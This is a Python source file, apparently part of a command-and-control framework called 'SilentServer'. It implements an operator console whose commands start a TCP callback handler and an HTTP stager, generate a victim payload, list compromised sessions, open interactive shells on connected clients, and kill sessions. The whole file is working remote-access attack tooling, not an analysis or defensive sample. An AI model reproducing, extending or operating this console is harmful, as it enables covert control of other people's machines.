from core.SilentServer   import SilentServer
from core.HttpServer     import HTTPServer
from core.ClientHandler  import ClientHandler

import os
import core.TextAssets

class CommandHandler:
        def __init__(self, silent_server: object, http_server: object) -> None:
                self.silent_server      = silent_server
                self.http_server        = http_server
                self.commands           = {
                        "shell"         : {
                            "args"      : 1,
                            "function"  : self.shell,
                        },
                        "sessions"      : {
                            "args"      : 0,
                            "function"  : self.sessions
                        },
                        "generate"      : {
                            "args"      : 0,
                            "function"  : self.generate
                        },
                        "jobs"          : {
                            "args"      : 0,
                            "function"  : self.jobs
                        },
                        "start"         : {
                            "args"      : 3,
                            "function"  : self.start
                        },
                        "stop"          : {
                            "args"      : 1,
                            "function"  : self.stop
                        },
                        "kill"          : {
                            "args"      : 1,
                            "function"  : self.kill
                        },
                        "help"          : {
                            "args"      : 0,
                            "function"  : self.get_help
                        },
                        "clear"         : {
                            "args"      : 0,
                            "function"  : self.clear
                        },
                        "exit"          : {
                            "args"      : 0,
                            "function"  : self.done
                        }
                }

        def validate(self, command: str, num_args: int) -> bool:
                if command not in self.commands.keys():
                        self.not_found()
                        return False

                if self.commands[command]["args"] != num_args:
                        self.wrong_args()
                        return False

                return True

        def handle_input(self, user_input: str) -> None:
                if not user_input:
                        return

                user_input              = user_input.split()
                command                 = user_input[0].lower()
                num_args                = len(user_input) - 1

                if not self.validate(command, num_args):
                        return

                if not self.commands[command]["args"]:
                        self.commands[command]["function"]()
                        return

                if self.commands[command]["args"]:
                        args            = user_input[1:]
                        self.commands[command]["function"](args)
                        return

        def shell(self, client_id: list) -> None:
                client_id               = client_id[0]

                if not self.silent_server.clients:
                        print("No sessions established.")
                        return

                active_clients          = []

                for client in self.silent_server.clients:
                        if client.client_status == "Active":
                                active_clients.append(client)

                if len(active_clients) == 0:
                        print("No active sessions.")
                        return

                FOUND                   = False

                for client in self.silent_server.clients:
                        if client.client_id == client_id:
                            FOUND       = True
                            break

                if not FOUND:
                        print("Client doesn't exist.")
                        return

                client.client_usage     = "Yes"
                client_handler          = ClientHandler(client)
                client_handler.begin_comm()
                client.client_usage     = "No"
                
        def sessions(self) -> None:
                if self.silent_server.clients:
                        core.TextAssets.print_clients(self.silent_server.clients)

                else:
                        print("No sessions established.")

        def generate(self) -> None:
                if self.silent_server.listener:
                        core.TextAssets.print_info("Generating payload ...")
                        payload         = self.silent_server.get_payload()
                        payload         = core.TextAssets.make_gray(payload)
                        print(payload)

        def jobs(self) -> None:
                if not self.silent_server.listener and not self.http_server.listener:
                        print("No jobs running.")
                        return

                jobs                    = []
                jobs.append(("TCP Handler", str(self.silent_server.callback_port), bool(self.silent_server.server_thread)))
                jobs.append(("HTTP Stager", str(self.http_server.listen_port),     bool(self.http_server.server_thread)))
                core.TextAssets.print_jobs(jobs)

        def start(self, args: list) -> None:
                job                     = args[0].lower()
                callback_address        = args[1]
                port                    = args[2]

                if job == "handler":
                        self.silent_server = SilentServer(callback_address, port)
                        
                        if self.silent_server.initialize_server():
                                core.TextAssets.print_success()

                if job == "stager":
                        callback_port    = self.silent_server.callback_port
                        self.http_server = HTTPServer(callback_address, port, callback_port)
                        
                        if self.http_server.initialize_server():
                                core.TextAssets.print_success()

                        

        def stop(self, job: str) -> None:
                job                     = job[0].lower()

                if job == "handler":
                        if self.silent_server.shutdown():
                                core.TextAssets.print_success()

                if job == "stager":
                        if self.http_server.shutdown():
                                core.TextAssets.print_success()


        def kill(self, client_id) -> None:
                client_id               = client_id[0]

                if not self.silent_server.clients:
                        print("No sessions established.")
                        return

                active_clients          = []

                for client in self.silent_server.clients:
                        if client.client_status == "Active":
                                active_clients.append(client)

                if len(active_clients) == 0:
                        print("No active sessions.")
                        return

                FOUND                   = False

                for client in self.silent_server.clients:
                        if client.client_id == client_id:
                            FOUND       = True
                            break

                if not FOUND:
                        print("Client doesn't exist.")
                        return

                client.client.close()
                core.TextAssets.print_success()

        def get_help(self) -> None:
                core.TextAssets.get_help()

        def clear(self) -> None:
                if os.name == "nt":
                        os.system("cls")
                        return

                os.system("clear")

        def done(self) -> None:
                raise Exception("Exitting ...")

        def not_found(self) -> None:
                print("Command not recognized.")

        def wrong_args(self) -> None:
                print("Command needs correct args.")